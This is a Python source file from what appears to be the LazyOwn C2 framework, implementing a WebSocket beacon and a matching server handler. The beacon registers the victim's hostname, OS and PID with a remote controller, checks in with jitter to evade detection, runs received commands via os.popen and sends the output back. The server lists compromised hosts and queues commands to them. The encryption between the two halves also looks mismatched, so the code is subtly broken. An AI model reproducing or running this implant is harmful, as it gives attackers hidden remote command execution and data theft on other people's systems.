"""WebSocket beacon transport for modern C2 channels.

Provides WebSocket-based beacon implementation and server-side handler
that integrates with the LazyOwn C2 framework via Socket.IO events.
"""

import asyncio
import json
import os
import ssl
import threading
import time
import uuid
from base64 import b64encode, b64decode
from typing import Any, Callable, Dict, List, Optional


try:
    import websocket
    HAS_WEBSOCKET_CLIENT = True
except ImportError:
    HAS_WEBSOCKET_CLIENT = False

try:
    import websockets
    HAS_WEBSOCKET_SERVER = True
except ImportError:
    HAS_WEBSOCKET_SERVER = False

try:
    from cryptography.fernet import Fernet
    HAS_FERNET = True
except ImportError:
    HAS_FERNET = False

WS_PORT = 9443
WS_HOST = '0.0.0.0'
WS_PATH = '/ws/beacon'
WS_PING_INTERVAL = 30
WS_SLEEP_JITTER = 5


class WebSocketBeacon:
    """WebSocket-based beacon for C2 communication.

    Connects to a WebSocket server with optional TLS and AES encryption.
    Supports jitter, sleep intervals, and task queuing.

    Args:
        server_url: WebSocket server URL (ws:// or wss://).
        beacon_id: Unique beacon identifier. Auto-generated if None.
        encryption_key: Optional AES encryption key (Fernet format).
        sleep_seconds: Base sleep time between check-ins.
        jitter_percent: Random jitter percentage added to sleep time.
        ssl_verify: Whether to verify TLS certificates.
        proxy: Optional HTTP/SOCKS proxy URL.
    """

    def __init__(
        self,
        server_url: str,
        beacon_id: Optional[str] = None,
        encryption_key: Optional[bytes] = None,
        sleep_seconds: int = 10,
        jitter_percent: float = 0.2,
        ssl_verify: bool = False,
        proxy: Optional[str] = None,
    ):
        if not HAS_WEBSOCKET_CLIENT:
            raise ImportError("websocket-client is required. Install with: pip install websocket-client")

        self.server_url = server_url.rstrip('/')
        self.beacon_id = beacon_id or str(uuid.uuid4()).replace('-', '')[:16]
        self.sleep_seconds = sleep_seconds
        self.jitter_percent = jitter_percent
        self.ssl_verify = ssl_verify
        self.proxy = proxy
        self._running = False
        self._tasks: List[Dict] = []
        self._results: List[Dict] = []
        self._ws: Optional[websocket.WebSocket] = None

        if encryption_key and HAS_FERNET:
            self._fernet = Fernet(encryption_key)
        else:
            self._fernet = None

    def _encrypt(self, data: str) -> str:
        """Encrypt data using Fernet if available."""
        if self._fernet:
            return b64encode(self._fernet.encrypt(data.encode())).decode()
        return b64encode(data.encode()).decode()

    def _decrypt(self, data: str) -> str:
        """Decrypt data using Fernet if available."""
        if self._fernet:
            return self._fernet.decrypt(b64decode(data)).decode()
        return b64decode(data).decode()

    def _build_message(self, msg_type: str, payload: Any = None) -> str:
        """Build a JSON message with encryption."""
        message = {
            'type': msg_type,
            'beacon_id': self.beacon_id,
            'timestamp': int(time.time()),
            'payload': payload or {},
        }
        raw = json.dumps(message)
        return self._encrypt(raw)

    def _jittered_sleep(self) -> None:
        """Sleep with jitter to avoid predictable check-in patterns."""
        import random
        jitter = self.sleep_seconds * self.jitter_percent * random.uniform(-1, 1)
        sleep_time = max(1, self.sleep_seconds + jitter)
        time.sleep(sleep_time)

    def connect(self) -> bool:
        """Establish WebSocket connection to the C2 server.

        Returns:
            bool: True if connected successfully.
        """
        try:
            ws_kwargs: Dict[str, Any] = {
                'enable_multithread': True,
            }

            if self.server_url.startswith('wss://') and not self.ssl_verify:
                ws_kwargs['sslopt'] = {'cert_reqs': ssl.CERT_NONE}

            if self.proxy:
                ws_kwargs['http_proxy_host'] = self.proxy

            self._ws = websocket.create_connection(self.server_url, **ws_kwargs)

            register_msg = self._build_message('register', {
                'hostname': os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', 'unknown'),
                'os': os.name,
                'pid': os.getpid(),
            })
            self._ws.send(register_msg)
            return True

        except Exception:
            return False

    def check_in(self) -> Optional[Dict]:
        """Send heartbeat and retrieve pending tasks.

        Returns:
            Task dict if tasks are pending, None otherwise.
        """
        if not self._ws or not self._ws.connected:
            return None

        try:
            self._ws.send(self._build_message('heartbeat', {
                'task_count': len(self._tasks),
                'result_count': len(self._results),
            }))

            self._ws.settimeout(5)
            response = self._ws.recv()

            if response == 'pong':
                return None

            data = json.loads(self._decrypt(response))
            return data.get('payload', {})

        except websocket.WebSocketTimeoutException:
            return None
        except Exception:
            return None

    def send_result(self, task_id: str, output: str, exit_code: int = 0) -> None:
        """Send command execution result back to C2.

        Args:
            task_id: ID of the task being reported.
            output: Command output.
            exit_code: Exit code of the command.
        """
        if self._ws and self._ws.connected:
            try:
                self._ws.send(self._build_message('result', {
                    'task_id': task_id,
                    'output': output[:8192],
                    'exit_code': exit_code,
                }))
            except Exception:
                pass

    def run(self, command_handler: Optional[Callable[[str], tuple]] = None) -> None:
        """Main beacon loop with check-in and command execution.

        Args:
            command_handler: Callable that takes a command string and returns
                             (output, exit_code). Uses os.popen if None.
        """
        import random

        self._running = True

        while self._running:
            try:
                if not self._ws or not self._ws.connected:
                    if not self.connect():
                        self._jittered_sleep()
                        continue

                task = self.check_in()

                if task and 'command' in task:
                    cmd = task['command']
                    task_id = task.get('task_id', 'unknown')

                    if command_handler:
                        output, exit_code = command_handler(cmd)
                    else:
                        try:
                            result = os.popen(cmd)
                            output = result.read()
                            exit_code = result.close() or 0
                        except Exception as e:
                            output = str(e)
                            exit_code = 1

                    self.send_result(task_id, output, exit_code if isinstance(exit_code, int) else 0)

                self._jittered_sleep()

            except KeyboardInterrupt:
                break
            except Exception:
                self._jittered_sleep()

        self.shutdown()

    def shutdown(self) -> None:
        """Gracefully shutdown the beacon."""
        self._running = False
        if self._ws:
            try:
                self._ws.close()
            except Exception:
                pass
            self._ws = None


class WebSocketC2Handler:
    """Server-side WebSocket handler for receiving beacon connections.

    Integrates with the LazyOwn C2 framework via callback hooks.

    Args:
        host: Bind address.
        port: Bind port.
        ssl_context: Optional SSL context for TLS.
        beacon_callback: Callable invoked when a beacon connects.
        task_callback: Callable invoked when beacon requests tasks.
        result_callback: Callable invoked when beacon sends results.
    """

    def __init__(
        self,
        host: str = WS_HOST,
        port: int = WS_PORT,
        ssl_context: Optional[ssl.SSLContext] = None,
        beacon_callback: Optional[Callable] = None,
        task_callback: Optional[Callable] = None,
        result_callback: Optional[Callable] = None,
    ):
        if not HAS_WEBSOCKET_SERVER:
            raise ImportError("websockets is required. Install with: pip install websockets")

        self.host = host
        self.port = port
        self.ssl_context = ssl_context
        self.beacon_callback = beacon_callback
        self.task_callback = task_callback
        self.result_callback = result_callback
        self.beacons: Dict[str, Any] = {}
        self._server: Optional[Any] = None
        self._running = False

    async def _handle_connection(self, websocket, path: str) -> None:
        """Handle an incoming WebSocket connection from a beacon.

        Args:
            websocket: The connected WebSocket.
            path: Connection path.
        """
        beacon_id = None

        try:
            async for message in websocket:
                try:
                    data = json.loads(message)
                except json.JSONDecodeError:
                    continue

                msg_type = data.get('type', '')
                beacon_id = data.get('beacon_id', 'unknown')
                payload = data.get('payload', {})

                if msg_type == 'register':
                    self.beacons[beacon_id] = {
                        'websocket': websocket,
                        'hostname': payload.get('hostname', 'unknown'),
                        'os': payload.get('os', 'unknown'),
                        'pid': payload.get('pid', 0),
                        'last_seen': time.time(),
                    }
                    if self.beacon_callback:
                        self.beacon_callback(beacon_id, payload)

                elif msg_type == 'heartbeat':
                    if beacon_id in self.beacons:
                        self.beacons[beacon_id]['last_seen'] = time.time()

                    if self.task_callback:
                        tasks = self.task_callback(beacon_id)
                        if tasks:
                            await websocket.send(json.dumps({
                                'type': 'task',
                                'payload': tasks,
                            }))
                        else:
                            await websocket.send('pong')

                elif msg_type == 'result':
                    if self.result_callback:
                        self.result_callback(beacon_id, payload)

                elif msg_type == 'task':
                    if self.task_callback:
                        tasks = self.task_callback(beacon_id)
                        if tasks:
                            await websocket.send(json.dumps({
                                'type': 'task',
                                'payload': tasks,
                            }))

        except Exception:
            pass
        finally:
            if beacon_id and beacon_id in self.beacons:
                del self.beacons[beacon_id]

    async def start(self) -> None:
        """Start the WebSocket C2 server."""
        self._running = True
        self._server = await websockets.serve(
            self._handle_connection,
            self.host,
            self.port,
            ssl=self.ssl_context,
        )

    async def stop(self) -> None:
        """Stop the WebSocket C2 server."""
        self._running = False
        if self._server:
            self._server.close()
            await self._server.wait_closed()

    def start_in_thread(self) -> threading.Thread:
        """Start the WebSocket C2 server in a background thread.

        Returns:
            The daemon thread running the server.
        """
        loop = asyncio.new_event_loop()
        thread = threading.Thread(target=self._run_loop, args=(loop,), daemon=True)
        thread.start()
        return thread

    def _run_loop(self, loop: asyncio.AbstractEventLoop) -> None:
        """Run the asyncio event loop in a thread."""
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.start())
        loop.run_forever()

    def send_task(self, beacon_id: str, command: str) -> bool:
        """Send a command task to a specific beacon.

        Args:
            beacon_id: Target beacon ID.
            command: Command to execute.

        Returns:
            bool: True if task was queued for delivery.
        """
        beacon = self.beacons.get(beacon_id)
        if not beacon:
            return False

        try:
            ws = beacon['websocket']
            loop = asyncio.get_event_loop()
            task_msg = json.dumps({
                'type': 'task',
                'payload': {
                    'command': command,
                    'task_id': str(uuid.uuid4()),
                },
            })
            loop.call_soon_threadsafe(lambda: asyncio.ensure_future(ws.send(task_msg)))
            return True
        except Exception:
            return False

    def list_beacons(self) -> List[Dict]:
        """List all connected beacons.

        Returns:
            List of beacon info dicts.
        """
        return [
            {
                'beacon_id': bid,
                'hostname': info.get('hostname', 'unknown'),
                'os': info.get('os', 'unknown'),
                'pid': info.get('pid', 0),
                'last_seen': info.get('last_seen', 0),
            }
            for bid, info in self.beacons.items()
        ]

    def remove_stale_beacons(self, timeout: int = 300) -> List[str]:
        """Remove beacons that have not checked in within the timeout.

        Args:
            timeout: Inactivity timeout in seconds.

        Returns:
            List of removed beacon IDs.
        """
        now = time.time()
        stale = [
            bid for bid, info in self.beacons.items()
            if now - info.get('last_seen', 0) > timeout
        ]

        for bid in stale:
            del self.beacons[bid]

        return stale
